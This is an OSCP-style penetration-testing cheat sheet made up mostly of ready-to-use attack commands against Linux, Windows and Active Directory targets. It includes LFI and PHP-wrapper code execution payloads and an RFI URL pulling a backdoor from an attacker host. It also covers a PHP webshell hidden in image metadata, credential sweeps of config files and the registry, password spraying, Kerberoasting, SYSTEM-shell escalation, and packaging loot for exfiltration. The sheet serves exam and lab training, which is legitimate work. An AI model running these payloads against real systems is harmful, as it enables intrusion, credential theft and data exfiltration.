# OSCP Command Cheat Sheet

Curated from the OSCP Assessment Template with added quick wins for both Linux and Windows targets.

## Network & Discovery
- `sudo nmap -sn <cidr>` – Fast discovery of live hosts via ICMP/ARP.
- `arp-scan <cidr>` – Layer 2 discovery for hosts that ignore ICMP.
- `nmap -sC -sV -p- <target>` – Full TCP enumeration with scripts and version detection.
- `nmap -sU --top-ports 100 <target>` – Lightweight UDP scan of common services.
- `whatweb <url>` – Fingerprint web technologies.
- `ffuf -u http://<host>/FUZZ -w /path/to/wordlist.txt -ic` – OWASP-style quick fuzz of directories/files.
- `gobuster dir -u http://<host> -w /path/to/wordlist.txt -x php,txt,bak` – Directory brute-force for low-effort web wins.
- `nikto -h http://<host>` – Catch obvious web misconfigurations.
- `zap-baseline.py -t http://<host>` – Rapid OWASP ZAP passive scan for easy findings.

## Web Application Testing
### Web Enumeration Examples
- `sudo nmap -p80  -sV 192.168.50.20` – Identify web server version.
- `gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5` – Discover hidden directories.
- `gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -x php,txt,html -t 10` – Deeper directory enumeration.
-  Debug Page Content: Look for comments, hidden fields, or debug info in HTML source.
-  Enumerate API:
   * patterns
    ```bash
    {GOBUSTER}/v1
    {GOBUSTER}/v2
    ```
   - `gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern` – Fuzz for API endpoints.
 - `curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login` – Test API login functionality.
   - If logoin successful, you should receive a token like below:
    ```bash
    kali@kali:~$ curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login

     {"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew", "message": "Successfully logged in.", "status": "success"}

    kali@kali:~$ curl  \
    'http://192.168.50.16:5002/users/v1/admin/password' \
    -H 'Content-Type: application/json' \
    -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
    -d '{"password": "pwned"}'

    {
    "detail": "The method is not allowed for the requested URL.",
    "status": 405,
    "title": "Method Not Allowed",
    "type": "about:blank"
    }
    
    ```
- Check cross-site scripting stored or reflected 
    * https://gist.github.com/michenriksen/d729cd67736d750b3551876bbedbe626
    * XSS simple payload : https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/#tools
    * XSS Polyglot : https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/2%20-%20XSS%20Polyglot/
- .htaccess upload to restrict access to certain files https://swisskyrepo.github.io/PayloadsAllTheThings/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/
  
  - .htaccess file 
    ```bash
    # .htaccess
    <FilesMatch "\.(php|php5|phtml|html|htm|js|css|exe|pl|py|sh|rb|cgi)$">
    Order Allow,Deny
    Deny from all
    </FilesMatch>

    AddType application/x-httpd-php .htaccess
    ```

### Webshells

- PHP windows reverse shell https://github.com/Dhayalanb/windows-php-reverse-shell

### Web Exploitation

- Local File Inclusion (LFI) to Remote Code Execution (RCE) example (find application config for password, upload webshell, user enumeration, ssh private):
  - `http://<target>/index.php?page=../../../../etc/passwd` – Test for LFI vulnerability. (log poison if possible)
- PHP wrapper
  - Data rapper : `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"`
  - Php rapper : `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php`
- Remote File Inclusion (RFI) example:
  - `curl "http://mountaindesserts.com/meteor/index.php?page=http://<attacker ip>/simple-backdoor.php&cmd=ls"` – Host a simple webshell on your machine.
- File upload:
    - upload ssh key to web server
        ```bash
        kali@kali:~$ ssh-keygen
        Generating public/private rsa key pair.
        Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
        Enter passphrase (empty for no passphrase): 
        Enter same passphrase again: 
        Your identification has been saved in fileup
        Your public key has been saved in fileup.pub
        ...

        kali@kali:~$ cat fileup.pub > authorized_keys
        ```
    - upload php webshell to web server 
      - https://revshells.com/
    - upload hidden webshell in image file
      - https://github.com/convisolabs/CVE-2021-22204-exiftool/blob/master/exploit.py
      - `exiftool -comment='<?php system($_GET["cmd"]); ?>' image.jpg` – Embed PHP webshell in image metadata.
- Command Injection
  - `http://<target>/index.php?page=ping&ip=
  - find exploitable parameter in the web request that passes user input to system commands.
## Host Enumeration – Linux
- `uname -a` – Kernel and architecture info.
- `hostnamectl` – Hostname, OS, and hardware summary.
- `ip a; ip route` – Interface and routing insight.
- `ss -tulnp` – Listening sockets and owning processes.
- `sudo -l` – Discover permitted sudo commands.
- `find / -perm -4000 -type f 2>/dev/null` – SUID binary sweep.
- `cat /etc/passwd | cut -d: -f1` – List local users.
- `linpeas.sh` – Automated privilege escalation checks (`./linpeas.sh`).
- `./pspy64 -pf -i 5` – Watch scheduled tasks and processes without root.

## Host Enumeration – Windows
- `systeminfo` – OS version, roles, hotfix baseline.
- `ipconfig /all` – Network layout.
- `whoami /all` – Identity, groups, and privileges.
- `netstat -ano` – Active network connections and PIDs.
- `tasklist /svc` – Running services and owning processes.
- `wmic qfe get Caption,Description,HotFixID,InstalledOn` – Patch inventory.
- `winPEAS.exe /quiet` – Automated Windows privilege escalation checks.

## Credential & Service Abuse (nxc + quick wins)
- `nxc smb <target>/24 -u <user> -p <pass> --shares` – Enumerate SMB shares with credential reuse.
- `nxc smb <target> -u users.txt -p passwords.txt --no-brute` – Password spray with lockout-safe timing.
- `nxc winrm <target> -u <user> -p <pass> -x "whoami"` – Test WinRM command execution.
- `nxc rdp <target> -u <user> -p <pass>` – Validate RDP credential success and NLA status.
- `nxc ssh <target> -u <user> -p <pass>` – SSH credential testing.

## Kerberos & AD Tooling
- `nltest /dsgetdc:<domain>` – Identify the domain controller.
- `nslookup -type=SRV _ldap._tcp.<domain>` – Locate LDAP SRV records.
- `kerbrute userenum --dc <dc_ip> -d <domain> <userlist>` – Spray for valid domain users.
- `GetADUsers.py <domain>/<user>:<pass> -all` – Dump AD users via LDAP (Impacket).
- `GetNPUsers.py <domain>/<user>:<pass> -request` – AS-REP roasting collection.
- `GetUserSPNs.py <domain>/<user>:<pass> -request` – Kerberoasting for service accounts.
- `Rubeus.exe asktgt /user:<user> /password:<pass>` – Request TGTs (aka "Rubese"); swap `/rc4` or `/ptt` for alternate modes.
- `certipy find -u <user>@<domain> -p <pass> -dc-ip <dc_ip>` – Discover AD CS misconfigurations.
- `bloodhound-python -u <user> -p <pass> -ns <dc_ip> -d <domain> -c All` – Collect BloodHound ingestors.
- `ldapdomaindump -u <user> -p <pass> ldap://<dc_ip>` – Export AD objects for offline review.

## Pivoting & Tunneling
- `ligolo-ng proxy -listen 0.0.0.0:11601 -selfcert` – Operator-side listener setup.
- `./agent -connect <operator_ip>:11601 -ignore-cert -relay 0.0.0.0:1080` – Compromised host agent to start SOCKS tunnel.
- `ifconfig tun0` (Linux) / `ipconfig` (Windows) – Verify tunnel interface once ligolo is running.
- `ssh -L <local_port>:<internal_host>:<internal_port> <user>@<pivot>` – Traditional SSH local port forward when available.

## Exploitation & Priv-Esc Execution
- `PrintSpoofer64.exe -i -c cmd.exe` – Weaponize SeImpersonatePrivilege for SYSTEM shell.
- `GodPotato.exe -cmd "cmd.exe"` – Alternate SeImpersonate exploit for modern builds.
- `wmiexec.py <domain>/<user>:<pass>@<target>` – Execute commands remotely (Impacket).
- `psexec.py <domain>/<user>:<pass>@<target>` – Drop service for SYSTEM shell via SMB.
- `evil-winrm -i <target> -u <user> -p <pass>` – PowerShell remoting with convenience features.
- `./linpeas.sh` / `winPEAS.exe` – Keep handy for immediate post-exploitation enumeration.

## Config & Credential Leaks – Linux
- `grep -R \"password\" /etc/* 2>/dev/null` – Sweep system configs for clear-text credentials.
- `grep -R \"passw\" /var/www -n 2>/dev/null` – Hunt web app secrets inside code and configs.
- `grep -R \"DB_USER\\|DB_PASS\" /opt /var -n 2>/dev/null` – Locate database credential variables.
- `find / -type f -iname \"*config*\" -size -2M 2>/dev/null | grep -Ei \"(db|cred|pass)\"` – Surface small readable config files likely to hold secrets.
- `grep -R \"AWS_ACCESS_KEY_ID\" /home 2>/dev/null` – Search user directories for cloud keys.
- `grep -R \"sshpass\" / -n 2>/dev/null` – Detect scripted SSH password usage.
- `strings /var/lib/tomcat*/conf/* | grep -i pass` – Extract credentials from Java/Tomcat configs.
- `awk -F= '/password/ {print FILENAME\":\"$0}' $(find /etc -name \"*.ini\" -o -name \"*.conf\" 2>/dev/null)` – Report ini/conf entries containing “password”.

## Config & Credential Leaks – Windows
- `findstr /si \"password\" C:\\Users\\*\\AppData\\Roaming\\*.ini C:\\inetpub\\wwwroot\\*.*` – Search user and web configs.
- `findstr /spin \"password\" *.xml *.config *.ini` – Recursive clear-text search from current directory.
- `findstr /spin \"connectionString\" C:\\inetpub\\wwwroot\\*.config` – Identify DB connection strings in web apps.
- `findstr /spin \"pass\" C:\\ProgramData\\*.ini C:\\ProgramData\\*.txt` – Scan application data for secrets.
- `Get-ChildItem -Path C:\\ -Include *.config,*.ini,*.xml -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern \"password\",\"secret\"` – PowerShell-wide search for credential terms.
- `Get-ChildItem C:\\Users -Filter *.rdp -Recurse | Select-String -Pattern \"password 51\"` – Spot embedded RDP credential blobs.
- `reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword` – Check for auto-login passwords.
- `reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" /s | find \"HostName\"` – Pull PuTTY session targets to review saved creds.

## Post-Exploitation Essentials
- `whoami && id` – Confirm privilege level on Linux.
- `hostname && ip a` – Document host and interface data.
- `dir C:\Users\*\Desktop` / `ls /home/*` – Hunt for proof flags.
- `tar czf /tmp/loot.tgz <files>` / `Compress-Archive` – Package artifacts for exfil when allowed.
- `del <uploaded_file>` / `rm <file>` – Clean up tooling per exam rules.

## Tool & Exploit References
- linPEAS: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
- winPEAS: https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
- ligolo-ng: https://github.com/nicocha30/ligolo-ng
- PrintSpoofer: https://github.com/dievus/printspoofer
- GodPotato: https://github.com/BeichenDream/GodPotato
- pspy (pspy64): https://github.com/DominicBreuker/pspy
- Rubeus: https://github.com/GhostPack/Rubeus
- NetExec (nxc): https://github.com/Pennyw0rth/NetExec
